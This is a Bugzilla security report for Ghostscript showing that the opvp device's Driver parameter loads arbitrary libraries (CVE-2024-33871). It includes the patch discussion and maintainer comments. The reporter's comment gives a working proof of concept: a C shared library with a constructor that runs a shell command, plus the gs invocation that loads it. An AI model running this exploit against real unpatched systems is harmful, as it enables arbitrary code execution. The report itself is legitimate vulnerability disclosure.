

Bugzilla – Bug 707754
OPVP device - Arbitrary code execution via custom Driver library
Last modified: 2024-05-24 13:26:11 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=707754&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=707754&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 707754**](show_bug.cgi?id=707754)
- OPVP device - Arbitrary code execution via custom Driver library

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
OPVP device - Arbitrary code execution via custom Driver library

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Ghostscript | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Ghostscript "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Security (public) ([show other bugs](buglist.cgi?component=Security%20(public)&product=Ghostscript&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P2 normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Chris Liddell (chrisl) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2024-04-21 15:27 UTC by zhutyra | | --- | --- | | Modified: | 2024-05-24 13:26 UTC ([History](show_activity.cgi?id=707754)) | | CC List: | 11 users (show)  akhaitov carnil cbuissar dr jsmeix ken.sharp marc.deslauriers rlescak robin.watts sam till.kamppeter | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Customer:](page.cgi?id=fields.html#cf_customer "A custom Free Text field in this installation of Bugzilla.") |  | | [Word Size:](page.cgi?id=fields.html#cf_wordsize "For example x86 would be 32 and x86_64 would be 64.") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**patch**](attachment.cgi?id=25611 "View the content of the attachment") (803 bytes, patch)  [2024-04-21 15:27 UTC](#attach_25611 "Go to the comment associated with the attachment"), zhutyra | [Details](attachment.cgi?id=25611&action=edit) | [Diff](attachment.cgi?id=25611&action=diff) | | [Add an attachment](attachment.cgi?bugid=707754&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=707754&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=707754#c0)  zhutyra    2024-04-21 15:27:29 UTC  ``` Created [attachment 25611](attachment.cgi?id=25611&action=diff "patch") [[details]](attachment.cgi?id=25611&action=edit "patch") patch  The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.  The patch does not allow changing this parameter after activating path control. ```  [Comment 1](show_bug.cgi?id=707754#c1)  zhutyra    2024-04-21 15:29:14 UTC  ``` Created [attachment 25612](attachment.cgi?id=25612) [[details]](attachment.cgi?id=25612&action=edit) exploit  Exploit for x86_64 Linux. ``` $ gs -q -dNODISPLAY opvplib.ps uid=1000(user) gid=1000(user) groups=1000(user) ```  The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually. ``` $ cat >lib.c <<"EOF" #include <stdlib.h> static void __attribute__ ((constructor)) init(void) {     exit(system("id")); } EOF $ gcc -fPIC -shared -o /tmp/lib.so lib.c $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice' uid=1000(user) gid=1000(user) groups=1000(user) ``` ```  [Comment 2](show_bug.cgi?id=707754#c2)  Ken Sharp    2024-04-22 12:42:34 UTC  ``` I've used the commit as supplied, thanks for that!  We're just about to start the process of a patch release, I'll amend the status when the patch is available which will be in a week or two, unless something else comes up.  I'm anticipating this might take us longer than usual because we will probably be applying for a CVE for this and other recent patches. It's become obvious that some distros have long term support versions of Ghostscript and they only apply patches with CVEs to those codebases. So we're more or less forced to get CVEs for any serious issues in order to ensure those versions get patched.  We're keeping all the security patches private until the release, because we know someone has been mining our repository for security related patches and exploiting them. So I'm afraid that I can't point you to a commit in the repository for review :-( ```  [Comment 3](show_bug.cgi?id=707754#c3)  Chris Liddell (chrisl)    2024-04-29 12:40:01 UTC  ``` CVE-2024-33871 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=707754)
* - [XML](show_bug.cgi?ctype=xml&id=707754)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=707754)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=707754&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=707754&GoAheadAndLogIn=1#forgot)
    Login:

    [x]

